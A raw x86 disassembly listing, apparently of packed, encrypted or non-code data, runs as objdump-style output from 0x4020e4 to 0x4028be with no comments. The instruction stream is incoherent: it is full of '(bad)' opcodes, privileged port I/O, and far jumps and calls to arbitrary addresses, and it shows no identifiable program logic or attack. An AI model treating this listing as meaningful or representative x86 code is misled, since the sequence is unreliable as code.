  4020e4:	and    DWORD PTR [edi+0x1b],edi
  4020e7:	gs push esi
  4020e9:	repz jg 0x402114
  4020ec:	fisttp DWORD PTR [edx+edi*1-0x9]
  4020f0:	scas   eax,DWORD PTR es:[edi]
  4020f1:	(bad)  
  4020f2:	pop    ecx
  4020f3:	cs inc edx
  4020f5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4020f6:	(bad)  
  4020f7:	rcr    DWORD PTR [ecx+0x21],0x74
  4020fb:	dec    DWORD PTR [esi+0x1d]
  4020fe:	mov    ecx,eax
  402100:	jecxz  0x40216a
  402102:	fnsave [ecx]
  402104:	out    dx,al
  402105:	xor    ecx,DWORD PTR [ecx-0x28695a2]
  40210b:	mov    edx,0xf6ed0ab4
  402110:	sbb    bh,al
  402112:	or     BYTE PTR ds:0xb0068330,0x4a
  402119:	lahf   
  40211a:	outs   dx,DWORD PTR ds:[esi]
  40211b:	mov    ebx,0xf0f71a98
  402120:	js     0x4020d2
  402122:	cmc    
  402123:	jmp    0xf9360d66
  402128:	cld    
  402129:	call   0x5fe0:0xe434b5f2
  402130:	imul   edi,DWORD PTR [edi-0x1524f1ae],0xffffffcc
  402137:	popa   
  402138:	inc    ebx
  402139:	mov    bl,0x31
  40213b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40213c:	(bad)  
  40213e:	mov    edx,DWORD PTR [ebx-0x28]
  402141:	dec    edi
  402142:	mov    ds:0xcc0266e3,eax
  402147:	neg    DWORD PTR [edi]
  402149:	shl    BYTE PTR [ebx],1
  40214b:	jbe    0x40211b
  40214d:	xchg   ebx,eax
  40214e:	cwde   
  40214f:	lods   eax,DWORD PTR ds:[esi]
  402150:	sbb    DWORD PTR ds:0xb65683a1,ecx
  402156:	pop    ecx
  402157:	and    DWORD PTR [edi-0x1b72c546],0xfffffff0
  40215e:	arpl   di,bx
  402160:	or     cl,BYTE PTR ds:0x77bb635
  402166:	mov    BYTE PTR [edi],ah
  402168:	jnp    0x4021ab
  40216a:	fiadd  WORD PTR [ebx]
  40216c:	sbb    al,0xf6
  40216e:	jnp    0x402120
  402170:	fldcw  WORD PTR [eax+0x10]
  402173:	jle    0x402198
  402175:	pop    ecx
  402176:	unpckhps xmm6,XMMWORD PTR [esi+ecx*2-0x5a203278]
  40217e:	ins    BYTE PTR es:[edi],dx
  40217f:	push   esp
  402180:	push   ds
  402181:	shr    DWORD PTR [ebp+0x73],cl
  402184:	sbb    eax,0x54dd6a0
  402189:	sbb    ecx,DWORD PTR [esi]
  40218b:	inc    ecx
  40218c:	pop    esp
  40218d:	push   esi
  40218e:	inc    eax
  40218f:	sti    
  402190:	pop    edx
  402191:	out    dx,al
  402192:	inc    eax
  402193:	das    
  402194:	hlt    
  402195:	push   esi
  402196:	or     DWORD PTR [ebp+0x5ddc99e0],edx
  40219c:	js     0x402196
  40219e:	mov    esi,DWORD PTR [edx+0x7a91fddc]
  4021a4:	sbb    al,ah
  4021a6:	and    cl,bh
  4021a8:	jns    0x402172
  4021aa:	jecxz  0x4021c1
  4021ac:	cmp    al,0xb0
  4021ae:	inc    BYTE PTR [esi]
  4021b0:	push   ebp
  4021b1:	pop    edi
  4021b2:	repnz cmp DWORD PTR [ecx+ebp*4],esp
  4021b6:	xor    edx,DWORD PTR [eax+0x35]
  4021b9:	xchg   edx,eax
  4021ba:	or     edi,DWORD PTR [edi-0x42]
  4021bd:	mov    ebx,0xd30148be
  4021c2:	out    0x8f,eax
  4021c4:	cli    
  4021c5:	shr    BYTE PTR [ecx-0x18ede500],1
  4021cb:	sti    
  4021cc:	in     al,dx
  4021cd:	cmp    al,dh
  4021cf:	pusha  
  4021d0:	jmp    0x40224f
  4021d2:	dec    esp
  4021d3:	push   DWORD PTR [edi-0x3eaf9411]
  4021d9:	jbe    0x4021f2
  4021db:	ror    BYTE PTR [esi],0xad
  4021de:	scas   eax,DWORD PTR es:[edi]
  4021df:	cld    
  4021e0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4021e1:	or     esi,edx
  4021e3:	aam    0xef
  4021e5:	xor    al,0x6a
  4021e7:	lea    esi,[ebx+ecx*2]
  4021ea:	aas    
  4021eb:	xor    eax,0x791d923b
  4021f0:	pop    es
  4021f1:	or     DWORD PTR [esp+edi*8],eax
  4021f4:	fidivr DWORD PTR [bp+di]
  4021f7:	fidiv  WORD PTR [ebx+0x78369d5e]
  4021fd:	arpl   WORD PTR ds:0xa1b98505,dx
  402203:	call   0xf6ae:0xb99e06a2
  40220a:	and    BYTE PTR [edi],bh
  40220c:	dec    edi
  40220d:	data16 fs jp 0x4021ea
  402211:	call   0x5e5:0x1c7a10e6
  402218:	cld    
  402219:	and    edx,edx
  40221b:	ss je  0x4021e1
  40221e:	adc    eax,0xb0a04b93
  402223:	mov    bl,0xf4
  402225:	xor    esi,DWORD PTR [ebx-0x3e]
  402228:	jge    0x4021e7
  40222a:	adc    ecx,0x26
  40222d:	loopne 0x4021c4
  40222f:	mov    al,ah
  402231:	out    dx,al
  402232:	in     eax,0x16
  402234:	dec    esi
  402235:	fwait
  402236:	inc    edi
  402237:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402238:	push   0x274abb39
  40223d:	call   0x32974b8b
  402242:	xor    ebx,edx
  402244:	push   ds
  402245:	das    
  402246:	cli    
  402247:	add    al,0xbd
  402249:	clc    
  40224a:	adc    ah,bl
  40224c:	repz aas 
  40224e:	aas    
  40224f:	stos   DWORD PTR es:[edi],eax
  402250:	sbb    edx,DWORD PTR [edi+0x5a]
  402253:	mov    bl,0xb
  402255:	adc    DWORD PTR [ebp-0x68fadc56],ecx
  40225b:	sub    ah,ah
  40225d:	jbe    0x4022a6
  40225f:	sub    eax,0x7c162671
  402264:	and    al,0x1b
  402266:	inc    ebp
  402267:	sub    DWORD PTR [ecx+0x52],0x3ac19643
  40226e:	jno    0x402208
  402270:	aaa    
  402271:	push   esi
  402272:	inc    ebx
  402273:	test   BYTE PTR [ebp+0x7f],0x7d
  402277:	xor    BYTE PTR [ecx-0x28832244],0x4a
  40227e:	ja     0x402267
  402280:	test   DWORD PTR [eax+ebp*1],edx
  402283:	push   0xffffffbf
  402285:	lahf   
  402286:	mov    al,0x49
  402288:	je     0x4022b4
  40228a:	fld    TBYTE PTR [ebp+ebx*8-0x23]
  40228e:	scas   eax,DWORD PTR es:[edi]
  40228f:	add    al,0x98
  402291:	adc    BYTE PTR [edi],0x9f
  402294:	sbb    eax,0xbacff00c
  402299:	sti    
  40229a:	xchg   BYTE PTR [eax-0x4ea6a97],cl
  4022a0:	sbb    BYTE PTR [edi],cl
  4022a2:	data16 lahf 
  4022a4:	ins    DWORD PTR es:[edi],dx
  4022a5:	jmp    0xb45e0ed3
  4022aa:	mov    eax,0x9d3a2f02
  4022af:	push   bp
  4022b1:	imul   ecx,DWORD PTR [esi-0x38],0x23
  4022b5:	outs   dx,BYTE PTR ds:[esi]
  4022b6:	idiv   ch
  4022b8:	or     al,0x20
  4022ba:	in     al,0x70
  4022bc:	mov    eax,ds:0x5decb53f
  4022c1:	jmp    0x4022bc
  4022c3:	dec    esp
  4022c4:	ficom  DWORD PTR [edi-0x3f]
  4022c7:	sbb    al,0x49
  4022ca:	or     eax,0xe31ef57a
  4022cf:	inc    BYTE PTR [esi]
  4022d1:	aas    
  4022d2:	fcmovbe st,st(2)
  4022d4:	cmp    DWORD PTR [ebx+0x7f042e38],ebx
  4022da:	mov    al,0xb7
  4022dc:	ins    DWORD PTR es:[edi],dx
  4022dd:	sbb    bh,dh
  4022df:	fnstsw WORD PTR [edx-0x38]
  4022e2:	outs   dx,BYTE PTR ds:[esi]
  4022e3:	fldcw  WORD PTR [ecx+0x10476c52]
  4022e9:	xor    BYTE PTR [esi],bh
  4022eb:	out    0x40,eax
  4022ed:	dec    ebx
  4022ee:	push   es
  4022ef:	(bad)  
  4022f0:	fistp  QWORD PTR [edx]
  4022f2:	outs   dx,DWORD PTR ds:[esi]
  4022f3:	pushf  
  4022f4:	std    
  4022f5:	adc    BYTE PTR [edi+0x2f141ec3],ch
  4022fb:	push   0x41
  4022fd:	lahf   
  4022fe:	out    dx,al
  4022ff:	and    BYTE PTR [ecx],al
  402301:	jnp    0x4022da
  402303:	fnsave [bp+0x51]
  402307:	shl    DWORD PTR [ebx-0x22],1
  40230a:	outs   dx,DWORD PTR ds:[esi]
  40230b:	stc    
  40230c:	xchg   ebp,eax
  40230d:	pop    ss
  40230e:	push   0xae52880b
  402313:	sbb    ebx,DWORD PTR fs:[eax]
  402316:	sti    
  402317:	loop   0x4022e1
  402319:	aam    0xea
  40231b:	cmp    ch,BYTE PTR [edi]
  40231d:	scas   al,BYTE PTR es:[edi]
  40231e:	iret   
  40231f:	enter  0x31a7,0x2e
  402323:	mov    bl,0xe0
  402325:	jl     0x402388
  402327:	mov    dl,0xfb
  402329:	jo     0x4022f0
  40232b:	sbb    eax,0x678a2707
  402330:	jne    0x4022c1
  402332:	push   esi
  402333:	mov    dl,bh
  402335:	jl     0x40231f
  402337:	int    0x5a
  402339:	jbe    0x4022bb
  40233b:	dec    ebp
  40233c:	inc    esp
  40233d:	je     0x4022dc
  40233f:	jle    0x402351
  402341:	jecxz  0x4023ad
  402343:	mov    bh,0x0
  402345:	fst    st(5)
  402347:	les    ebx,FWORD PTR [edi+0x69]
  40234a:	addr16 push ss
  40234c:	icebp  
  40234d:	mov    ah,0xc2
  40234f:	push   ebx
  402350:	das    
  402351:	sbb    al,0x36
  402353:	or     al,BYTE PTR ds:0x361b8c7d
  402359:	ja     0x40239f
  40235b:	pop    edx
  40235c:	jb     0x402356
  40235e:	or     eax,0x3d99df96
  402363:	mov    esp,0x39343c8
  402368:	xor    bl,BYTE PTR [edi+0x48]
  40236b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40236c:	sub    ecx,edx
  40236e:	test   al,0x4a
  402370:	pusha  
  402371:	out    0xe0,eax
  402373:	gs push 0x69
  402376:	aad    0x49
  402378:	sub    dl,BYTE PTR [edi]
  40237a:	xchg   ecx,eax
  40237b:	push   DWORD PTR [edi+0x6d7d7735]
  402381:	retf   
  402382:	mov    edi,0xdb9ee4a6
  402387:	adc    BYTE PTR ds:0x9ccb1a17,bl
  40238d:	leave  
  40238e:	mov    esp,0xef5554bd
  402393:	mov    bh,0x89
  402395:	add    ebp,DWORD PTR [esi]
  402397:	push   cs
  402398:	mov    al,ds:0xcc33728b
  40239d:	inc    ebx
  40239e:	xor    DWORD PTR [edi+0x37b5ff5d],esi
  4023a4:	add    eax,0xdbe4066e
  4023a9:	mov    BYTE PTR [ebp-0x35a360f6],bh
  4023af:	jae    0x4023be
  4023b1:	and    eax,0xe1e0f722
  4023b6:	ror    ecx,1
  4023b8:	cmp    DWORD PTR [ecx+0x7f290698],0x20ee5f1f
  4023c2:	adc    eax,0xe9e365cd
  4023c7:	outs   dx,BYTE PTR ds:[esi]
  4023c8:	or     eax,0xd1ef451
  4023cd:	scas   al,BYTE PTR es:[edi]
  4023ce:	add    bl,BYTE PTR [esp+ebp*2-0x80]
  4023d2:	push   ebp
  4023d3:	bnd jmp 0x402417
  4023d6:	jp     0x40240a
  4023d8:	imul   ebx,DWORD PTR [edx-0x478ce4cc],0x3aba924b
  4023e2:	ja     0x4023d4
  4023e4:	xor    eax,0xa3cfde99
  4023e9:	mov    ds:0x551f0e12,eax
  4023ee:	mov    bl,0x19
  4023f0:	lock ret 
  4023f2:	in     eax,0xc3
  4023f4:	mov    edx,0x3a538aa4
  4023f9:	mov    eax,0x194d03e0
  4023fe:	js     0x4023b7
  402400:	ds in  al,0xb3
  402403:	xor    edi,esp
  402405:	aam    0x4f
  402407:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402408:	stos   BYTE PTR es:[edi],al
  402409:	push   eax
  40240a:	stos   BYTE PTR es:[edi],al
  40240b:	les    eax,FWORD PTR [ecx-0x25c74208]
  402411:	dec    eax
  402412:	cdq    
  402413:	pop    ebx
  402414:	dec    eax
  402415:	xchg   edi,eax
  402416:	repz xor eax,0x9fb54c59
  40241c:	xchg   dh,bl
  40241e:	les    esi,FWORD PTR [edx]
  402420:	and    eax,0x14def81d
  402425:	cmp    DWORD PTR [edx-0x650794a4],0x47e8cb47
  40242f:	sti    
  402430:	mov    esp,0x277b7eb
  402435:	xchg   ebx,eax
  402436:	mov    esi,0x8821a8c1
  40243b:	cmp    al,0x7
  40243d:	call   0x6461c9c7
  402442:	sti    
  402443:	xchg   esp,eax
  402444:	mov    cl,0x1e
  402446:	sub    ch,BYTE PTR [eax-0x6d8bda70]
  40244c:	imul   edx,DWORD PTR [edi-0x6],0xffffffcf
  402450:	addr16 aaa 
  402452:	inc    edx
  402453:	sub    DWORD PTR [ecx+0x1e947804],ecx
  402459:	sub    edi,DWORD PTR [esi]
  40245b:	ret    
  40245c:	ds sbb dh,cl
  40245f:	shl    BYTE PTR [edi+ebp*8+0x3e4a56e2],1
  402466:	push   cs
  402467:	jae    0x40246b
  402469:	les    ebx,FWORD PTR [eax-0x20ed6b41]
  40246f:	(bad)  [ebp+0x7e681f15]
  402475:	xchg   esp,eax
  402476:	cld    
  402477:	sub    al,0xfe
  402479:	dec    edx
  40247a:	enter  0xe675,0xcb
  40247e:	mov    ds:0xec717abf,eax
  402483:	mov    BYTE PTR [edx-0x6f8c1232],0x7a
  40248a:	je     0x4024a2
  40248c:	mov    esp,0x250afb16
  402491:	jns    0x402469
  402493:	dec    edi
  402494:	sbb    ecx,DWORD PTR [edx+0x5e]
  402497:	nop
  402498:	xor    eax,0x60d191af
  40249d:	jmp    0x4024d0
  40249f:	loop   0x40245b
  4024a1:	mov    esi,DWORD PTR [edi+edi*1]
  4024a4:	outs   dx,BYTE PTR ds:[esi]
  4024a5:	out    0x22,eax
  4024a7:	repz and al,0x5c
  4024aa:	adc    BYTE PTR [eax+0x7ba3a09],al
  4024b0:	xor    esp,DWORD PTR [eax]
  4024b2:	std    
  4024b3:	mov    ch,ah
  4024b5:	stos   BYTE PTR es:[edi],al
  4024b6:	xor    esp,DWORD PTR [esi+0x46]
  4024b9:	retf   0x22ee
  4024bc:	outs   dx,BYTE PTR ds:[esi]
  4024bd:	scas   al,BYTE PTR es:[edi]
  4024be:	jno    0x4024ad
  4024c0:	add    dh,ah
  4024c2:	mov    esi,0x3bc7e385
  4024c7:	fst    QWORD PTR [ebx-0x5d0e7956]
  4024cd:	push   esi
  4024ce:	adc    ebx,DWORD PTR [ecx]
  4024d0:	push   0x890110e2
  4024d5:	or     eax,0xec8611f4
  4024da:	test   al,0xf9
  4024dc:	mov    cl,0x9f
  4024de:	sbb    eax,esi
  4024e0:	js     0x402487
  4024e2:	fisub  DWORD PTR [ebx-0x11]
  4024e5:	cwde   
  4024e6:	test   bl,bh
  4024e8:	adc    esp,DWORD PTR [ebp+0x7b57db20]
  4024ee:	push   ebx
  4024ef:	(bad)  
  4024f0:	addr16 cwde 
  4024f2:	add    BYTE PTR [ebp-0x54],cl
  4024f5:	pop    ecx
  4024f6:	dec    edx
  4024f7:	inc    ebx
  4024f8:	fiadd  DWORD PTR [ebx-0x13]
  4024fb:	add    eax,eax
  4024fd:	out    dx,eax
  4024fe:	les    edx,FWORD PTR [edi-0x526ed8f9]
  402504:	sbb    dl,0x4e
  402507:	ds xchg ebp,ebp
  40250a:	xchg   BYTE PTR [eax+0x5e],dh
  40250d:	ja     0x4024c9
  40250f:	sub    al,0xee
  402511:	test   al,0x25
  402513:	call   0x5c1dc645
  402518:	cwde   
  402519:	pop    esi
  40251a:	js     0x40254c
  40251c:	stos   DWORD PTR es:[edi],eax
  40251d:	cmp    BYTE PTR [esi+0x6d5c0a5d],0xe1
  402524:	pop    ecx
  402525:	mov    al,0x3a
  402527:	and    bl,al
  402529:	test   al,0x49
  40252b:	cwde   
  40252c:	mov    bh,0x4c
  40252e:	daa    
  40252f:	retf   
  402530:	add    eax,0x8e647aa7
  402535:	mov    dh,0xd8
  402537:	mov    bl,BYTE PTR [esi+0x1652debd]
  40253d:	les    edx,FWORD PTR gs:[eax+0x18]
  402541:	sar    bl,0x12
  402544:	jns    0x402569
  402546:	loop   0x402512
  402548:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402549:	push   edx
  40254a:	sub    eax,DWORD PTR [eax-0x37]
  40254d:	ja     0x402551
  40254f:	fcom   QWORD PTR [ebx-0x17380d6d]
  402555:	jmp    0xe55e:0xd1b9425d
  40255c:	xchg   edx,eax
  40255d:	sub    eax,DWORD PTR [eax+edx*4+0x4b]
  402561:	xchg   ebp,edx
  402563:	dec    edx
  402564:	out    dx,eax
  402565:	enter  0xcca9,0xd2
  402569:	dec    edx
  40256a:	lods   al,BYTE PTR ds:[esi]
  40256b:	cmp    DWORD PTR [edi-0x444eb499],0x494971a9
  402575:	sbb    esi,esi
  402577:	or     eax,0x2bf06662
  40257c:	lahf   
  40257d:	ds adc al,0x1
  402580:	hlt    
  402581:	cs call 0x46b2a95
  402587:	vunpcklps ymm6,ymm0,YMMWORD PTR [edx]
  40258b:	icebp  
  40258c:	rcr    dl,1
  40258e:	scas   al,BYTE PTR es:[edi]
  40258f:	(bad)  
  402590:	stc    
  402591:	test   DWORD PTR [ecx+0x315761e5],edi
  402597:	inc    ebx
  402598:	push   0x8c71b95b
  40259d:	push   ecx
  40259e:	test   DWORD PTR [eax-0x49],edx
  4025a1:	es cmp ah,cl
  4025a4:	pusha  
  4025a5:	mov    ecx,0xe363fdda
  4025aa:	fs int3 
  4025ac:	data16 std 
  4025ae:	scas   eax,DWORD PTR es:[edi]
  4025af:	jmp    ecx
  4025b1:	cmp    eax,0x5335d633
  4025b6:	sbb    BYTE PTR [eax-0x6e],dl
  4025b9:	push   edx
  4025ba:	js     0x40256d
  4025bc:	hlt    
  4025bd:	xchg   esi,eax
  4025be:	sub    ebp,ebx
  4025c0:	dec    esi
  4025c1:	xchg   esp,eax
  4025c2:	inc    edi
  4025c3:	popf   
  4025c4:	std    
  4025c5:	mov    edi,0x5a25fa2f
  4025ca:	or     ebx,edi
  4025cc:	push   ss
  4025cd:	dec    ecx
  4025ce:	mov    DWORD PTR [edx+0x29],ecx
  4025d1:	nop
  4025d2:	jae    0x16be
  4025d7:	mov    esp,0xcaa958dd
  4025dc:	cmp    ebx,DWORD PTR [edx-0x620df1d9]
  4025e2:	mov    al,ds:0xb818612e
  4025e7:	pop    esi
  4025e8:	test   BYTE PTR [edi+0x35],dh
  4025eb:	cwde   
  4025ec:	jnp    0x402627
  4025ee:	test   DWORD PTR [edx-0x74171ea9],eax
  4025f4:	int3   
  4025f5:	push   cs
  4025f6:	ffree  st(2)
  4025f8:	imul   esi,DWORD PTR [ecx+0x680ce00f],0xffffff8a
  4025ff:	fisub  WORD PTR [edx-0x63]
  402602:	inc    eax
  402603:	mov    ecx,0x7a541a99
  402608:	shr    BYTE PTR [edi],0x7a
  40260b:	or     ch,bh
  40260d:	jb     0x4025cf
  40260f:	mov    ds,WORD PTR [ecx+0x5695fa61]
  402615:	inc    BYTE PTR ss:[esp+esi*2-0x4b]
  40261a:	cdq    
  40261b:	push   ebx
  40261c:	int3   
  40261d:	clc    
  40261e:	cmp    bh,ch
  402620:	push   ebp
  402621:	xor    eax,DWORD PTR [eax+0x20aac36d]
  402627:	add    bh,BYTE PTR [ecx+ebx*8+0x51]
  40262b:	mov    ecx,0xea6a6dfa
  402630:	mov    ch,0xd4
  402632:	scas   al,BYTE PTR es:[edi]
  402633:	sbb    ebp,DWORD PTR [ebx]
  402635:	dec    ebx
  402636:	arpl   WORD PTR ds:[eax+0x4e104d5d],si
  40263d:	mov    ebp,0xd6beec2d
  402642:	or     cl,bh
  402644:	js     0x40266a
  402646:	adc    BYTE PTR [esi],ah
  402648:	xchg   ecx,eax
  402649:	arpl   di,cx
  40264b:	pushf  
  40264c:	jne    0x4026c2
  40264e:	sbb    BYTE PTR [esi+0x3edd7afc],dh
  402654:	add    BYTE PTR [esi+0x55],bl
  402657:	add    al,0x90
  402659:	popf   
  40265a:	push   esi
  40265b:	ss loopne 0x402612
  40265e:	mov    ch,0xd
  402660:	dec    esp
  402661:	cmp    al,cl
  402663:	repnz mov cl,0x9f
  402666:	jb     0x4026bd
  402668:	div    DWORD PTR [ecx-0x219e616e]
  40266e:	mov    ds:0xc15bf89c,al
  402673:	push   0xffffffc8
  402675:	(bad)  
  402676:	loope  0x4026bd
  402678:	mov    ebp,0xb505e667
  40267d:	cmp    al,bl
  40267f:	pop    edi
  402680:	inc    edi
  402681:	sbb    dl,BYTE PTR fs:[ebx-0x3a]
  402685:	aam    0xbc
  402687:	(bad)  
  402688:	xchg   edx,eax
  402689:	daa    
  40268a:	inc    ebp
  40268b:	addr16 mov bh,ah
  40268e:	pop    eax
  40268f:	(bad)  
  402690:	hlt    
  402691:	(bad)  
  402692:	imul   edx,DWORD PTR [esi],0xe0a7d3cc
  402698:	inc    ecx
  402699:	out    dx,al
  40269a:	xchg   edx,eax
  40269b:	mov    ch,0x88
  40269d:	sbb    dl,BYTE PTR [edi]
  40269f:	scas   al,BYTE PTR es:[edi]
  4026a0:	adc    ebx,DWORD PTR [ebx]
  4026a2:	fsubr  st(2),st
  4026a4:	call   0x2bac4e91
  4026a9:	inc    ebp
  4026aa:	inc    esi
  4026ab:	fmul   DWORD PTR [ebx+eiz*8]
  4026ae:	daa    
  4026af:	dec    ebp
  4026b0:	pop    ebp
  4026b1:	(bad)  
  4026b2:	popf   
  4026b3:	add    esi,DWORD PTR [edi-0xc7abf54]
  4026b9:	stos   BYTE PTR es:[edi],al
  4026ba:	mov    ecx,0xdc17af07
  4026bf:	rcl    DWORD PTR [ebx],cl
  4026c1:	add    bh,bh
  4026c3:	xchg   DWORD PTR [esi+0x41],ebp
  4026c6:	or     edx,DWORD PTR [ebx+0x54]
  4026c9:	inc    ebp
  4026ca:	mov    cl,0xb7
  4026cc:	sbb    ebx,DWORD PTR [ecx-0x18]
  4026cf:	mul    DWORD PTR [ebx+0x103d5a7d]
  4026d5:	aad    0xa7
  4026d7:	mov    ah,0x14
  4026d9:	dec    ebx
  4026da:	(bad)  
  4026db:	adc    DWORD PTR [edx+0x2a0b196c],edx
  4026e1:	pop    esi
  4026e2:	add    DWORD PTR [eax],esp
  4026e4:	icebp  
  4026e5:	pusha  
  4026e6:	add    al,0xf7
  4026e8:	(bad)  
  4026e9:	into   
  4026ea:	or     al,0xd8
  4026ec:	cdq    
  4026ed:	ja     0x4026cb
  4026ef:	ins    DWORD PTR es:[edi],dx
  4026f0:	sub    ebp,DWORD PTR [ecx-0x141c229]
  4026f6:	ss mov ch,0x3f
  4026f9:	frstor [ecx+edx*1]
  4026fc:	outs   dx,BYTE PTR ds:[esi]
  4026fd:	ss dec edx
  4026ff:	scas   eax,DWORD PTR es:[edi]
  402700:	addr16 pop ss
  402702:	das    
  402703:	nop
  402704:	pop    ss
  402705:	mov    ah,0x11
  402707:	loope  0x402691
  402709:	ds sti 
  40270b:	pop    esp
  40270c:	aad    0x13
  40270e:	imul   eax,DWORD PTR [ecx],0xffffffce
  402711:	pop    esp
  402712:	add    dl,ch
  402714:	jecxz  0x402751
  402716:	popa   
  402717:	jp     0x4026d4
  402719:	jno    0x40274d
  40271b:	iret   
  40271c:	cdq    
  40271d:	dec    eax
  40271e:	sbb    cl,BYTE PTR [ecx+0xab9de8b]
  402724:	sahf   
  402725:	xchg   esp,eax
  402726:	or     eax,0x5ff43c91
  40272b:	dec    edx
  40272c:	and    al,0xd7
  40272e:	xchg   esi,eax
  40272f:	shl    edx,cl
  402731:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402732:	mov    ebp,0x93f2ca76
  402737:	repnz sub al,BYTE PTR [ebp+ecx*4-0x7c2aa386]
  40273f:	outs   dx,BYTE PTR ds:[esi]
  402740:	ror    DWORD PTR [eax],0xa6
  402743:	pop    ecx
  402744:	push   eax
  402745:	cmp    BYTE PTR [eax-0x50],al
  402748:	je     0x4027a6
  40274a:	mov    ds:0x86693f24,al
  40274f:	mov    dl,0x71
  402751:	xor    al,0x13
  402753:	(bad)  [eax-0x18790031]
  402759:	cli    
  40275a:	lea    edi,[ecx]
  40275c:	cwde   
  40275d:	or     DWORD PTR [edi-0x25],ebx
  402760:	idiv   ebx
  402762:	in     eax,dx
  402763:	mov    ebx,0x28a5da6e
  402768:	das    
  402769:	(bad)  
  40276b:	ja     0x4027a3
  40276d:	pop    esi
  40276e:	cdq    
  40276f:	jmp    0x3f565214
  402774:	fldcw  WORD PTR [ecx]
  402776:	enter  0xdb6d,0x28
  40277a:	or     bh,0x74
  40277d:	out    dx,al
  40277e:	jmp    0x83d611e9
  402783:	xchg   DWORD PTR [ebp+0x22],ebx
  402786:	jne    0x4027b5
  402788:	ficom  DWORD PTR [ebp+0xa]
  40278b:	dec    edx
  40278c:	shl    BYTE PTR [esi],cl
  40278e:	dec    esi
  40278f:	in     al,dx
  402790:	jmp    0xab18:0x95cd589c
  402797:	xor    BYTE PTR [edx],al
  402799:	scas   al,BYTE PTR es:[edi]
  40279a:	in     eax,dx
  40279b:	sbb    eax,0xb9315e64
  4027a0:	imul   ecx,DWORD PTR gs:[edx],0xffffffa5
  4027a4:	pop    edx
  4027a5:	iret   
  4027a6:	leave  
  4027a7:	repz shl BYTE PTR [ebx-0x483bd834],0x1
  4027af:	xor    BYTE PTR [edi+0x47],dh
  4027b2:	cwde   
  4027b3:	or     BYTE PTR [ebp+edi*8-0x4220af96],cl
  4027ba:	xlat   BYTE PTR ds:[ebx]
  4027bb:	aaa    
  4027bc:	inc    ebx
  4027bd:	mov    DWORD PTR [edi],eax
  4027bf:	ret    
  4027c0:	out    0x29,eax
  4027c2:	push   0x1b
  4027c4:	xchg   ebx,eax
  4027c5:	js     0x4027a6
  4027c7:	shl    ecx,cl
  4027c9:	xchg   DWORD PTR [ebx+0x4c],edi
  4027cc:	ins    DWORD PTR es:[edi],dx
  4027cd:	ds retf 0x2d8c
  4027d1:	push   0xc0df6e38
  4027d6:	and    esp,DWORD PTR [ecx-0x31]
  4027d9:	fld    DWORD PTR [edi-0x45]
  4027dc:	sbb    DWORD PTR [esp+edx*8-0x75ec9963],edx
  4027e3:	in     al,0xf9
  4027e5:	xor    DWORD PTR [ebx],ebp
  4027e7:	pop    ecx
  4027e8:	fisttp DWORD PTR [eax+eiz*4+0x73]
  4027ec:	xchg   edi,eax
  4027ed:	lds    ecx,FWORD PTR [ecx+edx*4+0x52aa20a3]
  4027f4:	or     al,0xa7
  4027f6:	xchg   esp,eax
  4027f7:	(bad)  
  4027f8:	fld    DWORD PTR [ecx-0x45]
  4027fb:	(bad)  
  4027fc:	idiv   BYTE PTR [edx+0x7c910812]
  402802:	ret    
  402803:	sbb    al,al
  402805:	mov    dl,0xf1
  402807:	sub    ah,BYTE PTR [edx]
  402809:	xor    ah,ch
  40280b:	or     ch,BYTE PTR [edx-0x1b]
  40280e:	xchg   esi,eax
  40280f:	adc    BYTE PTR cs:[edi],bh
  402812:	test   al,0xdd
  402814:	fsubr  QWORD PTR [esp+ebx*1]
  402817:	ja     0x4027ec
  402819:	fadd   DWORD PTR [ecx]
  40281b:	push   edi
  40281c:	(bad)  
  40281d:	and    DWORD PTR [edx-0x3678dbb9],eax
  402823:	pusha  
  402824:	loop   0x402849
  402826:	rcr    BYTE PTR [ebp-0x28],1
  402829:	pushf  
  40282a:	mov    bh,ch
  40282c:	mov    ds,WORD PTR [ebp+0x452ced96]
  402832:	pop    ds
  402833:	int    0xa2
  402835:	xchg   ebp,eax
  402836:	or     BYTE PTR [eax],bh
  402838:	sub    al,0x4c
  40283a:	aad    0xc1
  40283c:	mov    DWORD PTR [edx+0x7fef6966],eax
  402842:	je     0x4027d0
  402844:	pop    eax
  402845:	xabort 0x64
  402848:	mov    edx,0x1ed4af23
  40284d:	dec    esp
  40284e:	push   es
  40284f:	adc    DWORD PTR [edx],ebp
  402851:	xchg   esp,eax
  402852:	dec    esp
  402853:	ins    BYTE PTR es:[edi],dx
  402854:	sub    DWORD PTR [eax+0x30150f70],esi
  40285a:	and    al,0xee
  40285c:	pop    ds
  40285d:	add    al,0xc0
  40285f:	test   DWORD PTR [ebx],eax
  402861:	lds    edx,FWORD PTR [edi+0x5a91ffa7]
  402867:	aam    0xb5
  402869:	mov    bl,BYTE PTR [ebp-0x71]
  40286c:	enter  0xa643,0x99
  402870:	inc    ebx
  402871:	(bad)  
  402872:	sub    DWORD PTR [eax-0x2d],ebx
  402875:	mov    ebp,0x93dc73e0
  40287a:	(bad)  
  40287b:	loopne 0x4028fc
  40287d:	dec    ecx
  40287e:	inc    ebx
  40287f:	push   ds
  402880:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402881:	xlat   BYTE PTR ds:[ebx]
  402882:	push   ss
  402883:	jg     0x4028b1
  402885:	dec    ecx
  402886:	mov    ch,0x5
  402888:	mov    eax,ds:0xb338892e
  40288d:	cdq    
  40288e:	adc    bh,ch
  402890:	in     al,dx
  402891:	jmp    0x40290d
  402893:	cmc    
  402894:	aam    0x32
  402896:	lea    edx,[edx-0x7d7f7535]
  40289c:	adc    ebp,ecx
  40289e:	mov    edi,0x6d35e60c
  4028a3:	cmp    DWORD PTR [ecx-0x28d0c35b],0xffffff8a
  4028aa:	pop    edx
  4028ab:	sar    DWORD PTR [ecx+0x4a],1
  4028ae:	xchg   esi,eax
  4028af:	lds    esi,FWORD PTR [ebp-0x1d41e349]
  4028b5:	dec    edi
  4028b6:	push   ecx
  4028b7:	popa   
  4028b8:	cld    
  4028b9:	jle    0x40284c
  4028bb:	xlat   BYTE PTR ds:[ebx]
  4028bc:	or     dh,BYTE PTR [esi]
  4028be:	aaa    
